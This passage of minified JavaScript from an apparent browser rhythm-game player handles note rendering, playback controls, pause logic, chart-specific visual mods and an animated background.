Saira",clip((qwq[3]>0?qwqEnd.second-qwq[3]:.2-qwqEnd.second-qwq[3])*5),ctxos.textAlign="left",ctxos.fillText("EARLY",-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2610,800),ctxos.fillText("LATE",-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2625,838),ctxos.textAlign="right",ctxos.fillText(stat.noteRank[7],-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2775,800),ctxos.fillText(stat.noteRank[3],-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2775,838);try{shared$1.game.graphicHandler.resultHook(ctx,ctxos)}catch(u){console.warn(u)}ctxos.shadowBlur=0,ctxos.shadowColor="#000000",ctxos.resetTransform()}function clip(e){return e<0?0:e>1?1:e}class ScaledNote{constructor(t,n,s){this.img=t,this.scale=n;const r=-t.width/2*n,o=-t.height/2*n,l=t.width*n,d=t.height*n;this.full=u=>u.drawImage(t,r,o,l,d),this.head=u=>u.drawImage(t,r,0,l,d),this.body=(u,f,m)=>u.drawImage(t,r,f,l,m),this.tail=(u,f)=>u.drawImage(t,r,f-d,l,d),s&&(this.head=u=>u.drawImage(t,r,o,l,d),this.tail=(u,f)=>u.drawImage(t,r,f-d-o,l,d))}}const noteRender={note:{},hitFX:{},async update(e,t,n,s=!1){this.note[e]=new ScaledNote(t,n,s),e==="Tap"&&(this.note.TapBad=new ScaledNote(await imgPainter(t,"#6c4343"),n))},async updateFX(e,t,n,s,r,o){const l=await imgSplit(e,n,s),d=l.map(async f=>new ScaledNote(await imgShader(f,tmps.hitPerfectColor||"rgba(255,236,160,0.8823529)"),t)),u=l.map(async f=>new ScaledNote(await imgShader(f,tmps.hitGoodColor||"rgba(180,225,255,0.9215686)"),t));e.close(),this.hitFX.Perfect={effects:await Promise.all(d),numOfParts:r?0:4,duration:o|0||500},this.hitFX.Good={effects:await Promise.all(u),numOfParts:r?0:3,duration:o|0||500},l.forEach(f=>f.close())}};function drawNotes(){for(const e of app.holds)drawHold(e,timeChart);for(const e of app.dragsReversed)drawDrag(e);for(const e of app.tapsReversed)drawTap(e);for(const e of app.flicksReversed)drawFlick(e)}function drawTap(e){if(app.pauseTime&&shared$1.game.ptmain.gameConfig.reviewWhenResume&&e.scored)return;const t=e.isMulti&&app.multiHint,n=app.noteScaleRatio*(e.size||1);!e.visible||e.scored&&!e.badtime||(ctxos.setTransform(n*e.cosr,n*e.sinr,-n*e.sinr,n*e.cosr,e.offsetX,e.offsetY),e.badtime?(ctxos.globalAlpha=1-clip((performance.now()-e.badtime)/500),noteRender.note.TapBad.full(ctxos)):(ctxos.globalAlpha=e.alpha||(e.showPoint&&showPoint.checked?.45:0),main.qwqwq&&(ctxos.globalAlpha*=Math.max(1+(timeChart-e.realTime)/1.5,0)),noteRender.note[t?"TapHL":"Tap"].full(ctxos)))}function drawDrag(e){if(app.pauseTime&&shared$1.game.ptmain.gameConfig.reviewWhenResume&&e.scored)return;const t=e.isMulti&&app.multiHint,n=app.noteScaleRatio*(e.size||1);!e.visible||e.scored&&!e.badtime||(ctxos.setTransform(n*e.cosr,n*e.sinr,-n*e.sinr,n*e.cosr,e.offsetX,e.offsetY),e.badtime||(ctxos.globalAlpha=e.alpha||(e.showPoint&&showPoint.checked?.45:0),main.qwqwq&&(ctxos.globalAlpha*=Math.max(1+(timeChart-e.realTime)/1.5,0)),noteRender.note[t?"DragHL":"Drag"].full(ctxos)))}function drawHold(e,t){if(app.pauseTime&&shared$1.game.ptmain.gameConfig.reviewWhenResume&&e.scored)return;const n=e.isMulti&&app.multiHint,s=app.noteScaleRatio*(e.size||1);if(!e.visible||e.realTime+e.realHoldTime<t)return;ctxos.globalAlpha=e.alpha||(e.showPoint&&showPoint.checked?.45:0),main.qwqwq&&(ctxos.globalAlpha*=Math.max(1+(timeChart-e.realTime)/1.5,0)),ctxos.setTransform(s*e.cosr,s*e.sinr,-s*e.sinr,s*e.cosr,e.offsetX,e.offsetY);const r=app.scaleY/s*e.speed*app.speed,o=r*e.realHoldTime;e.realTime>t?(noteRender.note[n?"HoldHeadHL":"HoldHead"].head(ctxos),noteRender.note[n?"HoldHL":"Hold"].body(ctxos,-o,o)):noteRender.note[n?"HoldHL":"Hold"].body(ctxos,-o,o-r*(t-e.realTime)),noteRender.note.HoldEnd.tail(ctxos,-o)}function drawFlick(e){if(app.pauseTime&&shared$1.game.ptmain.gameConfig.reviewWhenResume&&e.scored)return;const t=e.isMulti&&app.multiHint,n=app.noteScaleRatio*(e.size||1);!e.visible||e.scored&&!e.badtime||(ctxos.setTransform(n*e.cosr,n*e.sinr,-n*e.sinr,n*e.cosr,e.offsetX,e.offsetY),e.badtime||(ctxos.globalAlpha=e.alpha||(e.showPoint&&showPoint.checked?.45:0),main.qwqwq&&(ctxos.globalAlpha*=Math.max(1+(timeChart-e.realTime)/1.5,0)),noteRender.note[t?"FlickHL":"Flick"].full(ctxos)))}function adjustSize(e,t,n){const{width:s,height:r}=e,{width:o,height:l}=t;return o*r>l*s?[o*(1-n)/2,(l-o*r/s*n)/2,o*n,o*r/s*n]:[(o-l*s/r*n)/2,l*(1-n)/2,l*s/r*n,l*n]}const lineImages=new Map;class LineImage{constructor(t){this.image=t,this.imageFC=null,this.imageAP=null,this.imageMP=null}async getFC(){return this.imageFC||(this.imageFC=await imgShader(this.image,"#a2eeff")),this.imageFC}async getAP(){return this.imageAP||(this.imageAP=await imgShader(this.image,"#a3ffac")),this.imageAP}async getMP(){return this.imageMP||(this.imageMP=await imgShader(this.image,"#feffa9")),this.imageMP}}$id("select-note-scale").addEventListener("change",e=>app.setNoteScale(e.target.value));$id("select-background-dim").addEventListener("change",e=>app.brightness=Number(e.target.value));$id("highLight").addEventListener("change",e=>app.multiHint=e.target.checked);const selectbg=$id("select-bg"),btnPlay=$id("btn-play"),btnPause=$id("btn-pause"),selectbgm=$id("select-bgm"),selectchart=$id("select-chart"),selectflip=$id("select-flip");selectflip.addEventListener("change",e=>{app.mirrorView(e.target.value)});const selectspeed=$id("select-speed");selectspeed.addEventListener("change",e=>{const t={Slowest:-9,Slower:-4,"":0,Faster:3,Fastest:5};app.speed=2**(t[e.target.value]/12)});const inputName$1=$id("input-name"),inputArtist=$id("input-artist"),inputCharter=$id("input-charter"),inputIllustrator=$id("input-illustrator"),selectDifficulty=$id("select-difficulty"),selectLevel=$id("select-level"),updateLevelText=e=>{const t=selectDifficulty.value||"SP",n=selectLevel.value||"?";return[t,n].join(" Lv.")};function updateLevelTextOut(e){levelText=updateLevelText()}updateLevelText();selectDifficulty.addEventListener("change",()=>levelText=updateLevelText());selectLevel.addEventListener("change",()=>levelText=updateLevelText());$id("select-volume").addEventListener("change",e=>{const t=Number(e.target.value);app.musicVolume=Math.min(1,1/t),app.soundVolume=Math.min(1,t),Promise.resolve().then(qwqPause).then(qwqPause)});const inputOffset=$id("input-offset"),showCE2=$id("showCE2"),showAcc=$id("showAcc");$id("showStat");const lowRes=$id("lowRes");$id("lockOri");const maxFrame=$id("maxFrame"),isMaxFrame=$id("isMaxFrame"),isForcedMaxFrame=$id("isForcedMaxFrame"),autoDelay=$id("autoDelay"),enableVP=$id("enableVP"),enableFR=$id("enableFR"),showPoint=$id("showPoint"),lineColor=$id("lineColor");enableVP.addEventListener("change",e=>app.enableVP=e.target.checked);enableFR.addEventListener("change",e=>app.enableFR=e.target.checked);app.playMode=0;const showTransition=$id("showTransition");lowRes.addEventListener("change",e=>{app.setLowResFactor(e.target.checked?window.devicePixelRatio<2?.85:.5:1)});selectbg.onchange=()=>{app.bgImage=bgs.get(selectbg.value),app.bgImageBlur=bgsBlur.get(selectbg.value),stage$1.resize()};maxFrame.addEventListener("change",function(){this.value<25&&(shared$1.game.ptmain.gameConfig.maxFrame=25),this.value>1e3&&(shared$1.game.ptmain.gameConfig.maxFrame=1e3),frameAnimater.setFrameRate(shared$1.game.ptmain.gameConfig.maxFrame,shared$1.game.ptmain.gameConfig.isForcedMaxFrame)});isMaxFrame.addEventListener("change",function(){frameAnimater.setFrameRate(this.checked?maxFrame.value:0,shared$1.game.ptmain.gameConfig.isForcedMaxFrame)});isForcedMaxFrame.addEventListener("change",function(){frameAnimater.setFrameRate(isMaxFrame.checked?maxFrame.value:0,this.checked)});emitter.addEventListener("change",function(){canvas.classList.toggle("fade",this.eq("stop")),btnPlay.value=this.eq("stop")?"播放":"停止",btnPause.value=this.eq("pause")?"继续":"暂停",btnPause.classList.toggle("disabled",this.eq("stop"));for(const e of $$(".disabled-when-playing"))e.classList.toggle("disabled",this.ne("stop"));this.eq("play")&&(!app.isFull&&!shared$1.game.ptmain.gameConfig.allowNonFullscreen&&doFullScreen(),app.playMode=shared$1.game.ptmain.gameConfig.autoplay&&shared$1.game.ptmain.gameConfig.account&&shared$1.game.ptmain.gameConfig.account.userBasicInfo.isPTDeveloper||shared$1.game.ptmain.playConfig.mode==="preview"?1:0)});btnPlay.addEventListener("click",async function(){this.classList.contains("disabled")||(this.classList.add("disabled"),await qwqStop(),this.classList.remove("disabled"))});btnPause.addEventListener("click",async function(){this.classList.contains("disabled")||await qwqPause()});status2.reg(emitter,"change",e=>main.qwqwq?"Reversed":"");status2.reg(selectflip,"change",e=>["","FlipX","FlipY","FlipX&Y"][e.value]);status2.reg(selectspeed,"change",e=>e.value);status2.reg(emitter,"change",e=>e.eq("pause")?"Paused":"");async function qwqStop(){if(emitter.eq("stop")){if(!selectchart.value)return msgHandler.sendError(shared$1.game.i18n.t("simphi.playErr.noChartSelected"));if(!selectbgm.value)return msgHandler.sendError(shared$1.game.i18n.t("simphi.playErr.noSongSelected"));app.stage.style.display="block";for(const n of main.before.values())await n();audio.play(res.mute,{loop:!0,isOut:!1}),app.prerenderChart(main.modify(charts.get(selectchart.value)));const e=chartsMD5.get(selectchart.value);stat.level=Number(levelText.match(/\d+$/)),stat.reset(app.chart.numOfNotes,e,selectspeed.value),await loadLineData(),app.bgImage=bgs.get(selectbg.value)||res.NoImageWhite,app.bgImageBlur=bgsBlur.get(selectbg.value)||res.NoImageWhite;const t=bgms.get(selectbgm.value);app.bgMusic=t.audio,app.bgVideo=t.video,duration=app.bgMusic.duration/app.speed,isInEnd=!1,isOutStart=!1,isOutEnd=!1,timeBgm=0,showTransition.checked||qwqIn.addTime(3e3),stage$1.resize(),frameAnimater.start(),qwqIn.play(),interact.activate(),emitter.emit("play")}else{emitter.emit("stop"),interact.deactive(),audio.stop(),frameAnimater.stop(),fucktemp1=!1,fucktemp2=null,app.pauseNextTick&&(clearInterval(app.pauseNextTick),app.pauseTime=0,app.pauseNextTick=null),hitFeedbackList.clear(),hitImageList.clear(),hitWordList.clear(),qwqIn.reset(),qwqOut.reset(),qwqEnd.reset(),curTime=0,curTime_ms=0,duration=0;for(const e of main.end.values())await e()}}async function loadLineData(){for(const e of app.lines)e.imageW=6220.8,e.imageH=7.68,e.imageL=[res.JudgeLine,res.JudgeLineMP,null,res.JudgeLineFC],e.imageS=1,e.imageA=1,e.imageD=!1,e.imageC=!0,e.imageU=!0;for(const e of chartLineData)if(selectchart.value===e.Chart){if(!app.lines[e.LineId]){msgHandler.sendWarning(shared$1.game.i18n.t("simphi.playErr.judgeLineDoesentExist",[e.LineId]));continue}bgs.has(e.Image)||msgHandler.sendWarning(shared$1.game.i18n.t("simphi.playErr.imageDoesentExist",[e.image]));const t=bgs.get(e.Image)||res.NoImageBlack;app.lines[e.LineId].imageW=t.width,app.lines[e.LineId].imageH=t.height,lineImages.has(t)||lineImages.set(t,new LineImage(t));const n=lineImages.get(t);app.lines[e.LineId].imageL=[t,await n.getMP(),await n.getAP(),await n.getFC()],app.lines[e.LineId].isCustomImage=!!bgs.get(e.Image),isFinite(e.Vert=parseFloat(e.Vert))&&(app.lines[e.LineId].imageS=Math.abs(e.Vert)*1080/t.height,app.lines[e.LineId].imageU=e.Vert>0),isFinite(e.Horz=parseFloat(e.Horz))&&(app.lines[e.LineId].imageA=e.Horz),isFinite(e.IsDark=parseFloat(e.IsDark))&&(app.lines[e.LineId].imageD=!!e.IsDark),isFinite(e.Scale=parseFloat(e.Scale))&&(app.lines[e.LineId].imageS=e.Scale),isFinite(e.Aspect=parseFloat(e.Aspect))&&(app.lines[e.LineId].imageA=e.Aspect),isFinite(e.UseBackgroundDim=parseFloat(e.UseBackgroundDim))&&(app.lines[e.LineId].imageD=!!e.UseBackgroundDim),isFinite(e.UseLineColor=parseFloat(e.UseLineColor))&&(app.lines[e.LineId].imageC=!!e.UseLineColor),isFinite(e.UseLineScale=parseFloat(e.UseLineScale))&&(app.lines[e.LineId].imageU=!!e.UseLineScale)}}async function qwqPause(){if(!(btnPause.classList.contains("disabled")||!tmps.canPause)&&!(emitter.eq("stop")||fucktemp1))if(btnPause.classList.add("disabled"),emitter.eq("play"))app.bgVideo&&app.bgVideo.pause(),app.pauseBackgroundDimPara1=null,qwqIn.pause(),showTransition.checked&&isOutStart&&qwqOut.pause(),curTime=timeBgm,audio.stop(),emitter.emit("pause"),btnPause.classList.remove("disabled");else{if(shared$1.game.ptmain.playConfig.mode==="preview"){clearInterval(app.pauseNextTick),app.bgVideo&&await playVideo(app.bgVideo,timeBgm*app.speed),qwqIn.play(),showTransition.checked&&isOutStart&&qwqOut.play(),isInEnd&&!isOutStart&&playBgm(app.bgMusic,timeBgm*app.speed),emitter.emit("play"),btnPause.classList.remove("disabled");return}app.pauseTime=3,app.pauseBackgroundDimPara1=performance.now(),app.pauseNextTick=setInterval(async()=>{app.pauseTime--,app.pauseTime<=0&&(app.pauseTime=0,clearInterval(app.pauseNextTick),app.pauseNextTick=null,app.pauseBackgroundDimPara1=1/0,shared$1.game.ptmain.gameConfig.reviewWhenResume||(app.bgVideo&&await playVideo(app.bgVideo,timeBgm*app.speed),qwqIn.play(),showTransition.checked&&isOutStart&&qwqOut.play(),isInEnd&&!isOutStart&&playBgm(app.bgMusic,timeBgm*app.speed),emitter.emit("play")),btnPause.classList.remove("disabled"))},1e3),shared$1.game.ptmain.gameConfig.reviewWhenResume&&curTime>3&&(curTime>3&&(timeBgm=curTime-=3),app.bgVideo&&await playVideo(app.bgVideo,timeBgm*app.speed),qwqIn.play(),showTransition.checked&&isOutStart&&qwqOut.play(),isInEnd&&!isOutStart&&playBgm(app.bgMusic,timeBgm*app.speed),emitter.emit("play"),btnPause.classList.add("disabled"))}}main.stat=stat;var hook$1=self.hook=main;const flag0="flag{qwq}";hook$1.before.set(flag0,()=>{const e=hook$1.chartsMD5.get(hook$1.selectchart.value),t=["cdb5987ad81b70e3dc96153af2efaa61","86d23af0cc595a703241536a2d29ee4b","f5f8c244d317006103b67e1cdf6eb85b","0e8ff64e65bf35382e30f980b5eec041"],n=["4ddcd5d923007d661911989e79fe8a59"];e==="ab9d2cc3eb569236ead459ad4caba109"?hook$1.now.set(flag0,loadModYukiOri()):t.includes(e)&&inputName$1.value==="Distorted Fate "?__vitePreload(()=>import("./DFLevelEffect-970cbe67.js"),["assets/DFLevelEffect-970cbe67.js","assets/ease-8defdd80.js"]).then(({loadMod:s})=>hook$1.now.set(flag0,s())):n.includes(e)&&inputName$1.value==="DESTRUCTION 3,2,1 "?__vitePreload(()=>import("./321LevelEffect-19982695.js"),["assets/321LevelEffect-19982695.js","assets/ease-8defdd80.js"]).then(({loadMod:s})=>hook$1.now.set(flag0,s())):hook$1.now.delete(flag0)});function loadModYukiOri(){console.log("好耶");const e=hook$1.audio.actx.createAnalyser();e.fftSize=4096;const t=()=>{const f=e.frequencyBinCount,m=new Uint8Array(f);e.getByteFrequencyData(m);const g=m.reduce((y,v)=>y+v)/f;return Math.min(1,g/255*2.15)};let n=null,s=NaN,r=NaN,o=NaN,l="",d=!1;const u=(f,m,g)=>(l=m,d=g,f);return f=>{const m=f*1.95,g=hook$1.tmps.bgMusic();if(g&&g!==n&&(g.connect(e),n=g),m<168)hook$1.stat.numOfNotes=305,hook$1.tmps.level="lN Lv.I2",hook$1.tmps.progress=m/218;else if(m<169){const y=1-(169-m)**3;hook$1.stat.numOfNotes=305+2195*y|0,hook$1.tmps.progress=t()}else hook$1.stat.numOfNotes=2500,hook$1.tmps.progress=t();if(m>325&&m<358){const y=hook$1.stat.perfect,v=hook$1.stat.good,x=hook$1.stat.bad;isNaN(s)&&(s=y),isNaN(r)&&(r=v),isNaN(o)&&(o=x),y!==s?s=u(y,"Ｏ(≧▽≦)Ｏ",!0):v!==r?r=u(v,"(＾ω＾)",!0):x!==o&&(o=u(x,"(⊙﹏⊙;)",!0)),m<327||m>334&&m<335||m>342&&m<343||m>350&&m<351?u(null,"(⊙o⊙)",!1):d||(l="(⊙ω⊙)"),hook$1.tmps.combo=l}}}const enableFilter=$id("enableFilter");(function(){const e=$id("filterInput");e.addEventListener("change",async function(){if(!e.value)return;const t=await __vitePreload(()=>import("./filter-c7f39a1e.js"),[]);try{const n=new t.default(e.value);main.filter=(s,r,o)=>{n.apply(s.canvas),s.drawImage(n.getImage(r,o,hook$1.filterOptions),0,0)}}catch(n){console.error(n),main.filter=null}}),enableFilter.addEventListener("change",function(){this.checked?e.dispatchEvent(new Event("change")):main.filter=null}),enableFilter.dispatchEvent(new Event("change"))})();main.stat=stat;main.app=app;main.res=res;main.audio=audio;main.msgHandler=msgHandler;main.frameAnimater=frameAnimater;main.qwqEnd=qwqEnd;main.bgms=bgms;main.oriBuffers=oriBuffers;main.selectbgm=selectbgm;main.selectchart=selectchart;main.chartsMD5=chartsMD5;main.noteRender=noteRender;main.ZipReader=ZipReader;main.tmps=tmps;main.qwq=qwq;main.qwqwq=!1;main.pause=()=>emitter.eq("play")&&qwqPause();shared$1.game.simphiPlugins={videoRecorder};Object.defineProperty(main,"time",{get:()=>timeBgm,set:async e=>{if(emitter.eq("stop")||fucktemp1)return;const t=emitter.eq("play");t&&await qwqPause(),curTime=timeBgm=e,t&&await qwqPause()}});(function(e){const t=document.getElementById("backgroundCanvas"),n=document.getElementById("gradientCanvas"),s=t.getContext("2d"),r=n.getContext("2d"),o=e.devicePixelRatio||1,l=15e3,d=.0025,u=.25,f=parseInt((e.innerWidth*e.innerHeight/l).toFixed(0));let m=[];e.addEventListener("resize",y,!1),e.addEventListener("resize",v,!1),e.addEventListener("orientationchange",y,!1),e.addEventListener("orientationchange",v,!1);function g(L,O,I,A,j){if(A>=j||O>=I||L<O||L>I)return NaN;let G,X,q;return G=j-A,X=I-O,q=G/X,A+(L-O)*q}function y(){t.width=e.innerWidth*o*u,t.height=e.innerHeight*o*u,t.style.width=`${e.innerWidth}px`,t.style.height=`${e.innerHeight}px`,s.scale(o*u*2,o*u*2),n.width=e.innerWidth*o*u,n.height=e.innerHeight*o*u,n.style.width=`${e.innerWidth}px`,n.style.height=`${e.innerHeight}px`,r.scale(o*u*2,o*u*2),r.translate(e.innerWidth/2,e.innerHeight/2)}function v(){m=[];for(let L=0;L<f;L++)m.push({i:L,x:Math.random()*e.innerWidth*.5,y:Math.random()*e.innerHeight*.5,baseRadius:25+Math.random()*50,baseAlpha:Math.random()*.5,velocity:.5*(4+Math.random()*.5),sinOffset:Math.random()*Math.PI*2})}const x=new Image,E=Math.PI/400,S=10;let w=!1;x.src="/src/core/bgGradientHQ.png",x.onload=function(){w=!0,console.log("bgImage onload")};function k(){r.clearRect(0,0,e.innerWidth,e.innerHeight);const L={w:e.innerWidth+S,h:e.innerHeight+S},O=L.w/2-Math.sqrt((.5*L.w)**2+(.5*L.h)**2),I=L.h/2-(L.w/2-O);r.drawImage(x,-(L.w/2-O),-(L.h/2-I),(L.w/2-O)*2,(L.h/2-I)*2),r.rotate(E)}function C(){s.clearRect(0,0,e.innerWidth,e.innerHeight),w&&k();for(let O=0;O<f;O++){let I=m[O],A=I.baseRadius*g(I.y,0,e.innerHeight+75,0,1);s.globalAlpha=I.baseAlpha*g(I.y,0,e.innerHeight*.5+75,0,1),s.fillStyle="rgb(15, 34, 76)",s.beginPath(),s.arc(I.x,I.y,A,0,Math.PI*2,!0),s.closePath(),s.fill(),I.y-=I.velocity,I.y-A*2<=0&&(I.y=e.innerHeight*.5+I.baseRadius*2),O%2===1?I.x+=Math.sin(Date.now()*d/4+I.sinOffset)*2:I.x-=Math.sin(Date.now()*d/4+I.sinOffset)*2}s.globalAlpha=1;const L=s.createLinearGradient(0,e.innerHeight*.5,0,e.innerHeight/4);L.addColorStop(0,"rgba(150, 150, 200, 1)"),L.addColorStop(1,"rgba(255, 255, 255, 0)"),s.fillStyle=L,s.fillRect(0,0,e.innerWidth,e.innerHeight)}function R(){y();const L=new FrameAnimater;L.setCallback(C),L.setFrameRate(30),v(),shared.game.bubbleAnimator=L,setTimeout(()=>{L.start(),document.getElementById("backgroundCanvas").classList.add("visible")},100)}R()})(window);
